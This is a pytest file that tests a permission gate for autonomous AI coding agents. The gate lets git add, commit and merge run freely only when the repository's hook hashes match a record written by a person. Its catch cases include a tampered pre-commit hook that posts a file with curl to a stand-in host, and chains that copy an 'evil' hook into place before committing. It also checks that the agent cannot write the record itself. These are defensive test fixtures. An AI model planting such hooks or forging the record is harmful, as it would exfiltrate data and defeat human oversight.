"""D106, Nachtrag 41 point 1 (O39-1, O37-1): a hook of the own clone is free where the owner recorded the hook state.

The order: under `--autonomous`, delta's forms `git add`, `git commit` and `git merge` of main in the own work clone
with a pre-commit hook are free where the owner recorded the state of the clone's hooks; at least a changed hook, a new
hook, core.hooksPath on a foreign folder and a hook as a symbolic link are caught. Found by delta's card OA-4d2e5b284c
(PR 328): at 63b88d07 `git add` with a pre-commit hook was blocked (autonomy_blocked), `git commit` and `git merge` of
main asked the owner (local_program, D91).

The rule: hook-state.json in the gate directory, which only a person writes (D25), names a clone by its path and each
hook by its name and the sha256 of its bytes; `proofbundle_gate.py hook-state <path>` prints that entry and writes
nothing. In autonomous operation, for `git add`, `git commit` and `git merge` (the state check of D3 for add and commit
and their chain, the local class of D91 for commit and merge), a hook counts no more where git takes the hooks from the
clone's own hook directory, which is no link, and the hook is a regular file whose bytes hash to the recorded value.
Everything else the state check reads counts as before; decide(), every answer without the flag and every answer under
Codex stay.

RED at 63b88d07: the free forms below and the subcommand. The catch cases and the controls are green at both.
"""
from __future__ import annotations

import hashlib
import json
import os
import pathlib
import subprocess
import sys
import time

import pytest

import _gate_answer as ga
import test_plugin_n29_work_profile_d71 as d71
import test_plugin_n37_local_class_d91 as d91

gate = d71.gate
pytestmark = d71.pytestmark
_clean = d71._clean
SCHEMA = "proofbundle-plugin/hook-state/v0.1"
PRE_COMMIT = b"#!/bin/sh\n# the house's pre-commit\nexit 0\n"
KINDS = ("b7n0de", "fremd", "ohne")


def _repo(tmp_path, kind="fremd"):
    """The repositories of D91 (d91._repos), one at a time: b7n0de the declared one of D71, fremd another owner's, ohne
    no declaration and no remote; on the branch topic, with a change to add."""
    repo = {"b7n0de": lambda: d71._repo(tmp_path),
            "fremd": lambda: d71._repo(tmp_path, url="https://github.com/someone/x.git", name="f"),
            "ohne": lambda: d71._repo(tmp_path, url=None, declaration=None, name="o")}[kind]()
    d71._git(repo, "checkout", "-q", "topic")
    (repo / "notes.md").write_text("changed\n")
    (tmp_path / "msg.txt").write_text("Merge main\n")
    return repo


def _hook(folder, name="pre-commit", body=PRE_COMMIT):
    path = pathlib.Path(folder) / name
    path.write_bytes(body)
    path.chmod(0o755)
    return path


def _sha(body: bytes) -> str:
    return hashlib.sha256(body).hexdigest()


def _gate_dir() -> pathlib.Path:
    folder = pathlib.Path(os.environ["PROOFBUNDLE_GATE_DIR"])
    folder.mkdir(parents=True, exist_ok=True)
    return folder


def _record(clones: list, text: str | None = None) -> None:
    """hook-state.json in the gate directory: clones as (path, {name: sha256}), or the text as it is."""
    data = {"schema": SCHEMA, "klone": [{"pfad": str(path), "haken": hooks} for path, hooks in clones]}
    (_gate_dir() / "hook-state.json").write_text(json.dumps(data) if text is None else text)


def _form(form, repo, tmp_path):
    return form.replace("{R}", str(repo)).replace("{T}", str(tmp_path))


def answered(repo, command, host="claude"):
    return d91.answered(repo, command, host)


#: delta's forms (card OA-4d2e5b284c): add, commit and the merge of main, with -C and without, alone and as the chain
#: D3 frees; and the other spellings of a merge with a message of its own D91 knows.
DELTA = [
    "git add notes.md", "git add -A", "git -C {R} add -A", "git commit -m work", "git -C {R} commit -m work",
    "git commit -F {T}/msg.txt", "git -C {R} merge -F {T}/msg.txt main", "git merge -m 'Merge main' main",
    "git merge --no-edit main", "git add -A && git commit -m work", "git -C {R} add -A && git -C {R} commit -m work",
]


@pytest.mark.parametrize("kind", KINDS)
@pytest.mark.parametrize("form", DELTA)
def test_D106_delta_forms_with_a_recorded_pre_commit_hook_are_free(tmp_path, form, kind):
    repo = _repo(tmp_path, kind)
    _hook(repo / ".git" / "hooks")
    command = _form(form, repo, tmp_path)
    before = answered(repo, command)
    assert before[0] in ("ask", "deny") and "free_recorded_hooks" not in before[1], before
    _record([(repo, {"pre-commit": _sha(PRE_COMMIT)})])
    decision, reasons, klasse = answered(repo, command)
    assert (decision, klasse) == ("pass", "lokal") and "free_recorded_hooks" in reasons, (form, reasons)


@pytest.mark.parametrize("form", ["git commit --amend --no-edit", "git commit --allow-empty -m empty",
                                  "git commit -s -m signed", "git merge -q --no-ff -m x main"])
def test_D106_the_other_spellings_of_commit_and_merge_of_d91_are_free_too(tmp_path, form):
    repo = _repo(tmp_path)
    _hook(repo / ".git" / "hooks")
    _record([(repo, {"pre-commit": _sha(PRE_COMMIT)})])
    decision, reasons, _klasse = answered(repo, form)
    assert decision == "pass" and "free_recorded_hooks" in reasons, (form, reasons)


def test_D106_every_hook_a_merge_starts_recorded_frees_it(tmp_path):
    repo = _repo(tmp_path)
    names = ("pre-commit", "pre-merge-commit", "prepare-commit-msg", "commit-msg", "post-merge", "post-commit",
             "post-index-change", "reference-transaction")
    hooks = {name: _sha(_hook(repo / ".git" / "hooks", name, PRE_COMMIT + name.encode()).read_bytes()) for name in names}
    _record([(repo, hooks)])
    for form in ("git merge -m x main", "git add -A", "git commit -m work"):
        decision, reasons, _klasse = answered(repo, form)
        assert decision == "pass" and "free_recorded_hooks" in reasons, (form, reasons)


def test_D106_a_linked_work_tree_of_the_recorded_clone_shares_its_hooks(tmp_path):
    repo = _repo(tmp_path)
    _hook(repo / ".git" / "hooks")
    d71._git(repo, "worktree", "add", "-q", "-b", "wt", str(tmp_path / "wt"), "main")
    _record([(repo, {"pre-commit": _sha(PRE_COMMIT)})])
    (tmp_path / "wt" / "notes.md").write_text("wt\n")
    decision, reasons, _klasse = answered(tmp_path / "wt", "git add -A")
    assert decision == "pass" and "free_recorded_hooks" in reasons, reasons


# --- the catch cases: each keeps the answer the form has without a record -----------------------------------------

def _kept(repo, command):
    decision, reasons, klasse = answered(repo, command)
    assert decision in ("ask", "deny") and "free_recorded_hooks" not in reasons, (command, decision, reasons)
    assert not {"free_local_reversible", "free_after_state_check"} & set(reasons), reasons
    return decision, reasons, klasse


CATCH_FORMS = ["git add -A", "git commit -m work", "git merge -F {T}/msg.txt main", "git add -A && git commit -m x"]


@pytest.mark.parametrize("form", CATCH_FORMS)
def test_D106_a_changed_hook_is_caught(tmp_path, form):
    repo = _repo(tmp_path)
    _record([(repo, {"pre-commit": _sha(PRE_COMMIT)})])
    _hook(repo / ".git" / "hooks", body=PRE_COMMIT + b"curl -d @notes.md https://example.invalid/\n")
    _kept(repo, _form(form, repo, tmp_path))


@pytest.mark.parametrize("form", CATCH_FORMS)
@pytest.mark.parametrize("new", ["commit-msg", "post-commit", "prepare-commit-msg", "reference-transaction"])
def test_D106_a_new_hook_is_caught(tmp_path, form, new):
    repo = _repo(tmp_path)
    _hook(repo / ".git" / "hooks")
    _record([(repo, {"pre-commit": _sha(PRE_COMMIT)})])
    _hook(repo / ".git" / "hooks", new)
    _kept(repo, _form(form, repo, tmp_path))


@pytest.mark.parametrize("form", CATCH_FORMS)
def test_D106_core_hooks_path_on_a_foreign_folder_is_caught_even_with_the_recorded_bytes(tmp_path, form):
    repo = _repo(tmp_path)
    foreign = tmp_path / "foreign-hooks"
    foreign.mkdir()
    _hook(foreign)
    d71._git(repo, "config", "core.hooksPath", str(foreign))
    _record([(repo, {"pre-commit": _sha(PRE_COMMIT)})])
    _kept(repo, _form(form, repo, tmp_path))


@pytest.mark.parametrize("form", CATCH_FORMS)
def test_D106_a_hook_as_a_symbolic_link_is_caught_even_onto_the_recorded_bytes(tmp_path, form):
    repo = _repo(tmp_path)
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    (repo / ".git" / "hooks" / "pre-commit").symlink_to(_hook(elsewhere))
    _record([(repo, {"pre-commit": _sha(PRE_COMMIT)})])
    _kept(repo, _form(form, repo, tmp_path))


def test_D106_a_hook_directory_that_is_a_link_is_caught(tmp_path):
    repo = _repo(tmp_path)
    foreign = tmp_path / "foreign-hooks"
    foreign.mkdir()
    _hook(foreign)
    hooks = repo / ".git" / "hooks"
    for p in hooks.iterdir():
        p.unlink()
    hooks.rmdir()
    hooks.symlink_to(foreign)
    _record([(repo, {"pre-commit": _sha(PRE_COMMIT)})])
    _kept(repo, "git commit -m work")


def test_D106_a_record_of_another_clone_frees_nothing(tmp_path):
    repo = _repo(tmp_path)
    other = _repo(tmp_path, "ohne")
    _hook(repo / ".git" / "hooks")
    for clones in ([other], [tmp_path], [repo / "sub"], [other, tmp_path]):
        _record([(path, {"pre-commit": _sha(PRE_COMMIT)}) for path in clones])
        _kept(repo, "git add -A")
        _kept(repo, "git commit -m work")


@pytest.mark.parametrize("text", [
    "{}", "[]", "not json", "",
    json.dumps({"schema": "proofbundle-plugin/hook-state/v0.2", "klone": [{"pfad": "{R}", "haken": {"pre-commit": "{S}"}}]}),
    json.dumps({"schema": SCHEMA, "klone": [{"pfad": "f", "haken": {"pre-commit": "{S}"}}]}),
    json.dumps({"schema": SCHEMA, "klone": [{"pfad": "{R}", "haken": {"pre-commit": "{S}"}, "notiz": "x"}]}),
    json.dumps({"schema": SCHEMA, "klone": [{"pfad": "{R}", "haken": {"pre-commit": "{S}"}}], "notiz": "x"}),
    json.dumps({"schema": SCHEMA, "klone": [{"pfad": "{R}", "haken": {"pre-commit": "{U}"}}]}),
    json.dumps({"schema": SCHEMA, "klone": [{"pfad": "{R}", "haken": {"pre-commit": "{S}", "commit-msg": "{U}"}}]}),
    json.dumps({"schema": SCHEMA, "klone": [{"pfad": "{R}", "haken": {"pre-commit": "{S}", "a/b": "{S}"}}]}),
    json.dumps({"schema": SCHEMA, "klone": [{"pfad": "{R}", "haken": {"pre-commit": "{S}", "commit-msg": 1}}]}),
    json.dumps({"schema": SCHEMA, "klone": [{"pfad": "{R}", "haken": {"pre-commit": "{P}"}}]}),
    json.dumps({"schema": SCHEMA, "klone": [{"pfad": "{R}", "haken": {"../hooks/pre-commit": "{S}"}}]}),
    json.dumps({"schema": SCHEMA, "klone": [{"pfad": "{R}", "haken": ["pre-commit"]}]}),
    json.dumps({"schema": SCHEMA, "klone": [{"pfad": "{R}", "haken": {"pre-commit": "{S}"}}, "x"]}),
    json.dumps({"schema": SCHEMA, "klone": [{"pfad": "{R}", "haken": {"pre-commit": "{S}"}},
                                            {"pfad": "{R}", "haken": {"pre-commit": "0" * 64}}]}),
    '{"schema": "%s", "klone": [{"pfad": "{R}", "haken": {"pre-commit": "%s", "pre-commit": "{S}"}}]}' % (SCHEMA, "0" * 64),
])
def test_D106_a_record_that_does_not_read_whole_frees_nothing(tmp_path, text, monkeypatch):
    repo = _repo(tmp_path)
    monkeypatch.chdir(tmp_path)   # a relative path "f" names the clone from here
    _hook(repo / ".git" / "hooks")
    sha = _sha(PRE_COMMIT)
    _record([], text.replace("{R}", str(repo)).replace("{S}", sha).replace("{U}", sha.upper()).replace("{P}", sha[:63]))
    _kept(repo, "git add -A")
    _kept(repo, "git commit -m work")


def test_D106_a_record_in_the_work_tree_or_a_gate_directory_inside_the_clone_frees_nothing(tmp_path, monkeypatch):
    repo = _repo(tmp_path)
    _hook(repo / ".git" / "hooks")
    entry = {"schema": SCHEMA, "klone": [{"pfad": str(repo), "haken": {"pre-commit": _sha(PRE_COMMIT)}}]}
    (repo / "hook-state.json").write_text(json.dumps(entry))
    _kept(repo, "git commit -m work")
    monkeypatch.setenv("PROOFBUNDLE_GATE_DIR", str(repo / ".gate"))
    _record([(repo, {"pre-commit": _sha(PRE_COMMIT)})])
    _kept(repo, "git commit -m work")
    _kept(repo, "git add -A")


def test_D106_a_recorded_hook_frees_no_other_source_of_a_program(tmp_path):
    repo = _repo(tmp_path)
    _hook(repo / ".git" / "hooks")
    _record([(repo, {"pre-commit": _sha(PRE_COMMIT)})])
    d71._git(repo, "config", "filter.x.clean", "cat")
    _kept(repo, "git add -A")
    _kept(repo, "git merge -m x main")


def test_D106_a_hook_larger_than_the_gate_hashes_is_caught(tmp_path):
    repo = _repo(tmp_path)
    body = PRE_COMMIT + b"#" * (1024 * 1024)
    _hook(repo / ".git" / "hooks", body=body)
    _record([(repo, {"pre-commit": _sha(body[:1024 * 1024 + 1])})])   # the bytes the gate would read
    _kept(repo, "git commit -m work")


def test_D106_a_detour_through_cd_gets_the_rewrite_of_d85_whose_calls_are_free(tmp_path):
    repo = _repo(tmp_path)
    _hook(repo / ".git" / "hooks")
    command = _form("cd {R} && git add -A && git commit -m work", repo, tmp_path)
    decision, reasons, klasse = answered(repo, command)
    assert (decision, klasse) == ("deny", "sperre") and "autonomy_blocked" in reasons, reasons
    _record([(repo, {"pre-commit": _sha(PRE_COMMIT)})])
    decision, reasons, klasse = answered(repo, command)
    assert (decision, klasse) == ("deny", "umweg") and "autonomy_rewrite" in reasons, reasons


def test_D106_a_chain_that_writes_a_hook_before_the_commit_is_caught(tmp_path):
    repo = _repo(tmp_path)
    _hook(repo / ".git" / "hooks")
    _record([(repo, {"pre-commit": _sha(PRE_COMMIT)})])
    (tmp_path / "evil").write_bytes(PRE_COMMIT + b"echo evil\n")
    for form in ("cp {T}/evil .git/hooks/pre-commit && git commit -m x", "cp {T}/evil .git/hooks/commit-msg; git add -A",
                 "printf x >> .git/hooks/pre-commit && git commit -m x"):
        _kept(repo, _form(form, repo, tmp_path))


@pytest.mark.parametrize("form", ["echo x > {G}/hook-state.json", "cp {T}/x.json {G}/hook-state.json",
                                  "tee {G}/hook-state.json < {T}/x.json"])
def test_D106_the_agent_cannot_write_the_record(tmp_path, form):
    repo = _repo(tmp_path)
    command = form.replace("{G}", str(_gate_dir())).replace("{T}", str(tmp_path))
    decision, reasons, _klasse = answered(repo, command)
    assert decision == "deny" and "write_to_gate_dir" in reasons, reasons
    out = gate.decide_write("Write", {"file_path": str(_gate_dir() / "hook-state.json"), "content": "{}"}, str(repo),
                            time.monotonic() + 60, "claude")
    assert out is not None and out.decision == "deny", out


# --- the controls: green at both ----------------------------------------------------------------------------------

def test_D106_control_without_the_flag_and_under_codex_the_answer_of_decide_stays(tmp_path):
    repo = _repo(tmp_path)
    _hook(repo / ".git" / "hooks")
    _record([(repo, {"pre-commit": _sha(PRE_COMMIT)})])
    for form in ("git add -A", "git commit -m work", "git merge -m x main"):
        for host in ("claude", "codex"):
            out = gate.decide(form, str(repo), time.monotonic() + 60, host)
            assert out is not None and out.decision in ("ask", "deny"), (form, host, out and out.decision)
            assert "free_recorded_hooks" not in [v.reason_id for v in out.verdicts]
        assert answered(repo, form, "codex")[0] in ("ask", "deny")


@pytest.mark.parametrize("form", ["git merge main", "git merge -F - main", "git merge -e -m x main",
                                  "git add -A && git commit -m x && git push origin topic", "git rebase main",
                                  "git stash pop", "git switch -c other", "git worktree add -b w2 {T}/w2 main"])
def test_D106_control_a_form_outside_the_rule_keeps_its_answer(tmp_path, form):
    repo = _repo(tmp_path)
    _hook(repo / ".git" / "hooks")
    command = _form(form, repo, tmp_path)
    before = answered(repo, command)
    _record([(repo, {"pre-commit": _sha(PRE_COMMIT)})])
    after = answered(repo, command)
    assert "free_recorded_hooks" not in after[1] and after[0] == before[0], (form, before, after)


@pytest.mark.parametrize("form", ["git worktree add -b w2 {T}/w2 main", "git -C {R} worktree add {T}/w3", "git switch -c other",
                                  "git checkout -b other", "git -C {R} push origin topic"])
def test_D106_control_a_recorded_hook_of_another_form_frees_nothing(tmp_path, form):
    repo = _repo(tmp_path)
    _hook(repo / ".git" / "hooks", "post-checkout")
    command = _form(form, repo, tmp_path)
    before = answered(repo, command)
    _record([(repo, {"post-checkout": _sha(PRE_COMMIT)})])
    after = answered(repo, command)
    assert "free_recorded_hooks" not in after[1] and after[0] == before[0] != "pass", (form, before, after)


def test_D106_control_without_a_hook_nothing_changes(tmp_path):
    repo = _repo(tmp_path)
    _record([(repo, {"pre-commit": _sha(PRE_COMMIT)})])
    assert answered(repo, "git add -A")[:2] == ("pass", ["free_after_state_check"])
    decision, reasons, klasse = answered(repo, "git merge -m x main")
    assert decision == "pass" and "free_local_reversible" in reasons and "free_recorded_hooks" not in reasons


# --- the hook, the reason and the subcommand -----------------------------------------------------------------------

def _run_hook(repo, tmp_path, command, flag=True):
    event = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "cwd": str(repo), "session_id": "s-d106",
             "tool_input": {"command": command}}
    env = {k: os.environ[k] for k in ("PATH", "HOME", "LC_ALL", "GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM",
                                      "PROOFBUNDLE_GATE_DIR")}
    env["CLAUDE_PLUGIN_DATA"] = env["PLUGIN_DATA"] = str(tmp_path / "data")
    proc, entry = ga.run_hook([sys.executable, "-I", gate.__file__, "--host", "claude", *(d91.AUTONOMOUS if flag else [])],
                              json.dumps(event), env, cwd=str(repo))
    assert proc.returncode == 0, proc.stderr
    return proc, entry


def test_D106_the_hook_lets_it_run_silently_and_logs_the_receipt(tmp_path):
    repo = _repo(tmp_path)
    _hook(repo / ".git" / "hooks")
    _record([(repo, {"pre-commit": _sha(PRE_COMMIT)})])
    proc, entry = _run_hook(repo, tmp_path, "git add -A && git commit -m work")
    assert proc.stdout.strip() == "", proc.stdout
    assert entry["autonomy"]["klasse"] == "lokal" and "free_recorded_hooks" in entry["reason_ids"], entry
    proc, entry = _run_hook(repo, tmp_path, "git add -A && git commit -m work", flag=False)
    assert json.loads(proc.stdout)["hookSpecificOutput"]["permissionDecision"] == "ask"


def test_D106_the_reason_names_no_path_of_the_environment(tmp_path):
    repo = _repo(tmp_path)
    _hook(repo / ".git" / "hooks")
    _record([(repo, {"pre-commit": _sha(PRE_COMMIT)})])
    deadline = time.monotonic() + 60
    out = gate.decide("git add -A", str(repo), deadline, "claude")
    out = gate.autonomous_outcome(out, "git add -A", str(repo), deadline, "claude")
    text = " ".join(v.text() for v in out.verdicts)
    assert str(_gate_dir()) not in text and os.environ["HOME"] not in text, text
    assert gate._SHORT_REASONS["free_recorded_hooks"][0] == "D106"
    assert "free_recorded_hooks" not in gate.FANG_REASONS


def _hook_state(*args, cwd=None):
    return subprocess.run([sys.executable, "-I", gate.__file__, "hook-state", *args], capture_output=True, text=True,
                          timeout=60, cwd=cwd, env={k: os.environ[k] for k in ("PATH", "HOME", "LC_ALL",
                                                                               "GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM",
                                                                               "PROOFBUNDLE_GATE_DIR")})


def test_D106_hook_state_prints_the_entry_and_writes_nothing(tmp_path):
    repo = _repo(tmp_path)
    _hook(repo / ".git" / "hooks")
    _hook(repo / ".git" / "hooks", "commit-msg", b"#!/bin/sh\nexit 0\n")
    (repo / ".git" / "hooks" / "post-merge").symlink_to(tmp_path / "msg.txt")
    gate_dir = _gate_dir()
    proc = _hook_state(str(repo))
    assert proc.returncode == 0, proc.stderr
    printed = json.loads(proc.stdout)
    assert printed["schema"] == SCHEMA and printed["klone"] == [
        {"pfad": os.path.realpath(repo), "haken": {"commit-msg": _sha(b"#!/bin/sh\nexit 0\n"), "pre-commit": _sha(PRE_COMMIT)}}]
    assert "post-merge" in proc.stderr and not list(gate_dir.iterdir())
    (gate_dir / "hook-state.json").write_text(proc.stdout)
    assert answered(repo, "git commit -m work")[0] == "pass"


def test_D106_hook_state_refuses_a_foreign_hook_directory(tmp_path):
    repo = _repo(tmp_path)
    (tmp_path / "foreign-hooks").mkdir()
    d71._git(repo, "config", "core.hooksPath", str(tmp_path / "foreign-hooks"))
    proc = _hook_state(str(repo))
    assert proc.returncode != 0 and proc.stdout == "", proc.stdout
    assert _hook_state(str(tmp_path / "nowhere")).returncode != 0
    assert _hook_state().returncode != 0
